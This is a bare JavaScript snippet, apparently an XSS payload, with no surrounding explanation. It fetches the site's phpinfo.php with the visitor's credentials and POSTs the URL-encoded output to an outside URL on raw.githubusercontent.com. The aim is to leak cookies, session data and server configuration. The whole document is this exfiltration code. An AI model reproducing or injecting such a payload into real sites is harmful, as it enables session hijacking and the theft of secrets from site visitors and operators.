var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange= function() {
if (xhttp.readyState == 4 && xhttp.status == 200) {

        var body = encodeURIComponent(xhttp.responseText);
        xhttp.open("POST", 'https://raw.githubusercontent.com/DonVorrin/TEST/refs/heads/main/phpinfo.php', true)
        xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')
        xhttp.send(body)

    }
};

xhttp.open("GET", "phpinfo.php", true);
xhttp.withCredentials = true;
xhttp.send();
